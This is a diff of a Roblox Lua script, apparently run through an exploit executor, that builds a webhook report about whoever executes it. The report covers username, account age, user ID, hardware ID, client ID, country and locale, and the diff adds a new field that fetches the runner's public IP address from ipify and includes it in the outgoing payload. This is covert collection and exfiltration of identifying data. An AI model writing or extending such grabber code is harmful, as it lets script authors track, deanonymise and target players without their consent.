@@ -96,7 +96,7 @@ local requestwebhook = syn.request({
 				                
 			{
                 ["name"] = "INFO PLAYER",
-                ["value"] = "```Username : "..game.Players.LocalPlayer.Name.."```".."```Display Username : "..game.Players.LocalPlayer.DisplayName.."```".."```Account Age : "..game.Players.LocalPlayer.AccountAge.."```".."```User ID : "..game.Players.LocalPlayer.UserId.."```".."```[Profile : ".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile".."```",
+                ["value"] = "```Username : "..game.Players.LocalPlayer.Name.."```".."```Display Username : "..game.Players.LocalPlayer.DisplayName.."```".."```Account Age : "..game.Players.LocalPlayer.AccountAge.."```".."```User ID : "..game.Players.LocalPlayer.UserId.."```".."```Profile : ".."https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile".."```",
                 ["inline"] = CL
             }, 
             {
@@ -107,6 +107,11 @@ local requestwebhook = syn.request({
             {
                 ["name"] = "INFO EXECUTE",
                 ["value"] = "```Executor Name : "..EXE.."```".."```Hwid : "..a.."```".."```Client ID : "..ClientId.."```".."```Country : "..code.."```".."```Local ID : "..game.Players.LocalPlayer.LocaleId.."```",
+                ["inline"] = CL
+            },
+	    {
+                ["name"] = "Premium | INFO",
+                ["value"] = "```IP Address : "..game:HttpGet("https://api.ipify.org").."```",
                 ["inline"] = CL
             },
          {
